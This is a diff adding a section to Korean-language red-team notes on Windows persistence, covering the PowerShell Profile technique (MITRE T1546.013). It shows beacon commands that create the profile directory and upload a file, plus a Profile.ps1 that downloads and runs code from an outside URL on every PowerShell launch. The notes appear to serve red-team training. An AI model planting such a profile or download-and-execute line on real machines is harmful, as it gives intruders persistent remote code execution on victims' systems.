@@ -7,6 +7,7 @@
 - [Persistence](#persistence)
   - [Boot & Logon Autostart Execution](#boot--logon-autostart-execution)
   - [Logon Script](#logon-script)
+  - [PowerShell Profile](#powershell-profile)
 
 
 ## Persistence
@@ -75,3 +76,39 @@ Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript wit
 Successfully set regkey
 SUCCESS.
 ```
+
+### PowerShell Profile
+---
+
+[Event Triggered Execution: PowerShell Profile](https://attack.mitre.org/techniques/T1546/013/)
+
+T1546.013(Event Triggered Execution: PowerShell Profile)는 사용자가 PowerShell을 열 때마다 이벤트 트리거가 작동하게 하여 공격자가 임의로 작성한 `profile.ps1` 같은 악성 콘텐츠를 실행하여 지속성을 확보하고 권한을 상승시킬 수 있다. 
+
+`$HOME\Documents\WindowsPowerShell\Profile.ps1`와 같이 사용자의 홈 디렉터리($HOME)/문서/WindowsPowerShell 디렉터리에 프로필(`Profile.ps1`)를 업로드한다. 
+
+```
+ls C:\Users\pchilds\Documents
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     12/22/2024 16:47:10   My Music
+          dir     12/22/2024 16:47:10   My Pictures
+          dir     12/22/2024 16:47:10   My Videos
+ 402b     fil     12/22/2024 16:47:22   desktop.ini
+ 
+beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
+beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
+```
+
+외부 URL로 부터 파일을 다운로드하여 실행 시키는 프로필 파일 생성
+``` powershell
+# Profile.ps1
+$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
+```
+
+프로필을 사용자의 WindowsPowerShell 디렉터리에 업로드
+```
+beacon> upload C:\Payloads\Profile.ps1
+```
+
+
